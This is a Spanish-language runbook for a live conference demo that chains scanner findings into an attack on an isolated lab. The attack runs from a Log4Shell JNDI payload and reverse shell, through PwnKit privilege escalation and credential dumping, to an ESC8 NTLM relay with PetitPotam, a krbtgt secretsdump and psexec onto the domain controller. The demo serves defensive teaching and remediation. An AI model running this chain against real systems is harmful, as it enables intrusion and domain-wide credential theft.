# Runbook — Bifrost en escenario

**Duración:** 30 min (25 demo + 5 cierre).
**Regla única:** nada que esté aquí se teclea por primera vez en vivo.

> Los valores que aparecen (IPs, dominio, credenciales) son los de
> [config/lab.env](../config/lab.env). Si cambias la configuración, cambia también
> estas líneas: el runbook es el único documento que repite literales, porque en
> escenario hay que poder copiar y pegar sin pensar.

> **Dónde se ejecuta cada bloque** — leyenda:
> `host` = laptop del presentador (PowerShell) · `kali` = VM atacante (terminales SSH) ·
> `web01`/`app02`/`dc01` = shell *dentro* de esa VM · `Tenable UI` = navegador con Tenable One.

---

## T-7 días

- [ ] Licencia de Tenable One confirmada para los hosts del lab (pedir por escrito al equipo Tenable). — `Tenable UI`
- [ ] Scanner enlazado y `Connected` en `Settings → Scanners`. — `Tenable UI`
- [ ] Política `BIFROST_TENABLE_POLICY` creada con credenciales SSH y Windows. — `Tenable UI`
- [ ] `python tenable_scan.py --action run --name "smoke"` termina en `completed` con un **Crítico**. — `host`
- [ ] `exploits/log4shell/selftest.sh` devuelve `cadena completa OK`. — `kali`
- [ ] `dc01` responde 401 sobre HTTP en `/certsrv/`. — `dc01`
- [ ] Snapshots `clean` creados en las 6 VMs. — `host`

## T-1 día

- [ ] Ensayo completo cronometrado (guion de abajo, sin leer). — `host` + `kali` + `Tenable UI`
- [ ] Ensayo de caos: apagar `web01` a mitad, practicar salto a plan B. — `host`
- [ ] Clip de respaldo de 90 s grabado (cadena completa, pantalla limpia). — `host`
- [ ] `.\bifrost.ps1 reset all` y verificar que arranca todo. — `host`
- [ ] Cargar batería, adaptadores, y **un segundo cable de red**.

## T-0, 30 minutos antes

**En:** `host`.

```powershell
.\bifrost.ps1 preflight
.\bifrost.ps1 status

# encender en el orden que respeta la RAM
.\bifrost.ps1 start scanner
.\bifrost.ps1 start web01
.\bifrost.ps1 start app02
.\bifrost.ps1 start dc01
.\bifrost.ps1 start ws01
```

Lanzar el escaneo **antes de entrar a la sala** (política y objetivos salen de la
configuración) — **en `host`**:

```powershell
python tenable\tenable_scan.py --action run --name "Bifrost en vivo" --out out\scan.nessus
```

Deja la terminal con el progreso visible. Cuando subas, ya lleva 10 minutos corriendo.

Preparar la terminal del ataque — **`host → kali`** (SSH):

```bash
ssh kali@192.168.56.66
source ~/bifrost/env.sh
chmod +x ~/bifrost/exploits/log4shell/*.sh   # scp desde Windows pierde el bit +x
cd ~/bifrost
```

---

## Guion

### 00:00 — Hook (tú)

**En:** slides en `host`.

> "Tenemos 47 hallazgos críticos en el reporte. La pregunta que nadie responde es:
> **¿cuál de ellos, encadenado con otros tres, me da el dominio?**
> Hoy lo vamos a responder en vivo."

Slide de arquitectura: 6 hosts, una red aislada, un escáner, un atacante.

### 03:00 — El qué (Tenable)

**En:** `Tenable UI`.

El colega de Tenable muestra, sobre el escaneo ya en curso:

- la política y las credenciales,
- el triage por VPR,
- **Attack Path Analysis**: la ruta `svc_backup → ADCS → DC01$ → Domain Admin`.

Frase de empalme: *"el producto dice que esta ruta existe; ahora la recorremos."*

### 08:00 — Puente 1: Log4Shell

**Slide:** plugin, CVSS 10.0, puerto 8983.

**En:** `kali` (tres terminales).

```bash
# terminal 1 — ambos scripts leen config/lab.env: sin argumentos
cd ~/bifrost/exploits/log4shell
./build.sh
./ldap-serve.sh

# terminal 2
nc -lvnp "$BIFROST_REVSHELL_PORT"

# terminal 3 — el disparo
curl "http://$TARGET_WEB:$BIFROST_SOLR_PORT/solr/admin/cores?action=\${jndi:ldap://$LHOST:$BIFROST_LDAP_PORT/Exploit}"
```

La shell llega a la terminal 2 (es una shell **en `web01`**, recibida en `kali`). En ella:

```bash
id
hostname
ip -br a
```

Narración: *"un `curl`. Eso es todo el acceso inicial."*

### 12:00 — Puente 2: root

**En:** shell en `web01` → luego `app02` (SSH).

Ya con shell en `web01`, la configuración del core entrega el siguiente salto:

```bash
cat /opt/solr/server/solr/intranet/conf/db.properties
# -> db.host, db.user, db.password: credenciales de app02

ssh "$BIFROST_APP_USER"@"$TARGET_APP"
sudo -l                          # misconfiguración sembrada
```

Privesc real (elige según el diagnóstico de `app02-privesc.sh`) — **en `app02`**:

```bash
# PwnKit
git clone https://github.com/berdav/CVE-2021-4034 /tmp/pk && cd /tmp/pk && make && ./cve-2021-4034
id
```

Frase: *"este hallazgo no existía sin credenciales. Con ellas, el escáner ve el kernel;
sin ellas, solo ve una puerta."*

### 15:00 — Puente 3: el salto a Windows

**En:** `kali` (de vuelta en la VM atacante).

```bash
nxc smb "$TARGET_WS" -u "$BIFROST_SVC_USER" -p "$BIFROST_SVC_PASS" --shares
nxc smb "$TARGET_WS" -u "$BIFROST_SVC_USER" -p "$BIFROST_SVC_PASS" --lsa
```

Si la cuenta tiene administración local en `ws01`, la shell es directa:

```bash
evil-winrm -i "$TARGET_WS" -u "$BIFROST_SVC_USER" -p "$BIFROST_SVC_PASS"
```

Si no, la escalada es la carpeta con `Everyone: Modify`:

```bash
# en kali: colocar un acceso directo o script que ejecute el próximo logon
```

> Este es el puente más frágil. **Ten ensayado el camino exacto** y un atajo:
> si el salto no es limpio, se cuenta con el diagrama y se pasa al puente 4,
> que es donde está el clímax.

### 19:00 — Puente 4: ESC8 → Domain Admin

**En:** `kali` (tres terminales).

Terminal 1:

```bash
source ~/bifrost/env.sh
mkdir -p ~/bifrost/loot
ntlmrelayx.py -t "http://$TARGET_DC/certsrv/certfnsh.asp" \
  -smb2support --adcs --template DomainController --output-folder ~/bifrost/loot
```

Terminal 2:

```bash
PetitPotam.py -u "$BIFROST_SVC_USER" -p "$BIFROST_SVC_PASS" -d "$BIFROST_DOMAIN" \
  "$LHOST" "$TARGET_DC"
```

La terminal 1 escupe el PFX. Terminal 3:

```bash
certipy auth -pfx ~/bifrost/loot/DC01.pfx -dc-ip "$TARGET_DC"
```

Anota el hash de `DC01$` y:

```bash
secretsdump.py -just-dc-user krbtgt "$BIFROST_DOMAIN/DC01\$"@"$TARGET_DC" -hashes :<HASH>
```

**Aquí se calla todo el mundo.** Deja que el hash de `krbtgt` se lea en pantalla.

```bash
psexec.py -k -no-pass "$BIFROST_DOMAIN/Administrator@$TARGET_DC"
dir C:\Corp\Finanzas
```

El `dir` se ejecuta **en `dc01`** (shell remota vía psexec).

### 24:00 — Impacto controlado (tú)

**En:** shell en `dc01`.

Abrir `Q4_Forecast_2026.txt` y leer una línea. **Nada más.** Sin cifrar, sin borrar,
sin exfiltrar. Se dice explícitamente:

> "El impacto se demuestra leyendo un archivo. No hace falta nada más, y no vamos
> a hacerlo."

### 26:00 — El giro: blue team (Tenable)

**En:** `Tenable UI`.

Volver a la consola de Tenable y mostrar la remediación propuesta:

- 4 hallazgos de severidad media/alta, ninguno crítico por separado.
- La cadena completa sí es crítica.
- **Mitigación quirúrgica:** deshabilitar NTLM en `certsrv` y exigir TLS rompe el
  puente 4. Parchear solo Log4Shell deja los otros tres intactos.
- Eventos que habrían aparecido: 4624 tipo 3, 4886/4887, 4662.

### 29:00 — Cierre

**En:** slides en `host`.

> "El escáner no reemplaza al red team y el red team no reemplaza al escáner.
> El escáner dice *qué* está roto. Nosotros dijimos *hasta dónde llega*.
> Y la diferencia entre las dos frases es la diferencia entre un reporte y una decisión."

---

## Matriz de contingencias

| Momento | Qué falla | Qué haces | Dónde |
|---|---|---|---|
| Cualquiera | Una VM no arranca | `.\bifrost.ps1 reset <vm>` y sigues | `host` |
| Escaneo | Tarda más de lo previsto | Muestras el `.nessus` pre-exportado; el público no ve la diferencia | `Tenable UI` |
| Puente 1 | LDAP no devuelve shell | Verificas callback con `selftest.sh`; si falla, usas el clip | `kali` |
| Puente 2 | La CVE no aplica | Salta al `sudo -l` (60 s) y di "el hallazgo que teníamos era otro" | `app02` |
| Puente 3 | No consigues sesión en ws01 | Lo cuentas con el diagrama y pasas al 4 | `kali` |
| Puente 4 | El relay no recibe | Repites la coacción una vez; si falla, clip de 90 s | `kali` |
| Todo | Se cae la red del venue | Todo es local: el lab no depende de internet salvo el dashboard | `host` |

**Frase comodín** (ensáyala, la vas a necesitar):

> "Esto es exactamente lo que pasa en un engagement real: el exploit no siempre
> funciona a la primera. Se cambia de técnica y se sigue."

---

## Después de la charla

**En:** `host`.

```powershell
.\bifrost.ps1 reset all
.\bifrost.ps1 snapshot all post-demo
```

Y guarda `out\scan.nessus` + `out\scan.md`: son evidencia de la demo y material
para el reporte interno.

---

## Anexo: comandos por si te quedas en blanco

**En:** `kali`.

```bash
source ~/bifrost/env.sh           # IPs y credenciales
cd ~/bifrost/exploits/log4shell   # puente 1
nxc smb --help                    # puente 3
cat ~/bifrost/exploits/esc8/README.md   # puente 4, cadena completa
```

**En:** `host`.

```powershell
.\bifrost.ps1 status
.\bifrost.ps1 ip all
```
